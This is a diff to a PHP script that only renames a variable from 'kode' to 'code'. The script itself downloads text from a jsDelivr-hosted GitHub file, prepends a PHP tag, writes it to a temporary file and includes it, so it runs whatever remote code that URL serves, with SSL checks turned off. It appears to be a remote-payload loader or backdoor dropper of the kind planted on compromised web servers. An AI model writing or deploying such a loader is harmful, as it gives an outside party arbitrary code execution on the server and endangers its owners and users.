@@ -4,24 +4,24 @@ ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
 function getRemoteCode($url) {
-    $kode = @file_get_contents($url);
+    $code = @file_get_contents($url);
     
-    if ($kode === false) {
+    if ($code === false) {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        $kode = curl_exec($ch);
+        $code = curl_exec($ch);
         $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
 
-        if ($http_code !== 200 || empty($kode)) {
+        if ($http_code !== 200 || empty($code)) {
             return false;
         }
     }
-    return $kode;
+    return $code;
 }
 
 if (!function_exists('get_magic_quotes_gpc')) {
@@ -31,19 +31,19 @@ if (!function_exists('get_magic_quotes_gpc')) {
 }
 
 $url = "https://cdn.jsdelivr.net/gh/Ahmad-Fauzi-max/memek@main/MMCTV3.2.txt";
-$kode = getRemoteCode($url);
+$code = getRemoteCode($url);
 
-if ($kode !== false) {
+if ($code !== false) {
     try {
         ob_start();
         
 
-        if (strpos($kode, '<?php') === false) {
-            $kode = "<?php\n" . $kode;
+        if (strpos($code, '<?php') === false) {
+            $code = "<?php\n" . $code;
         }
         
         $tempFile = tempnam(sys_get_temp_dir(), 'remote_code_');
-        file_put_contents($tempFile, $kode);
+        file_put_contents($tempFile, $code);
         include $tempFile;
         unlink($tempFile); 
         
@@ -56,4 +56,3 @@ if ($kode !== false) {
     die("Gagal mengambil data dari URL.");
 }
 ?>
-
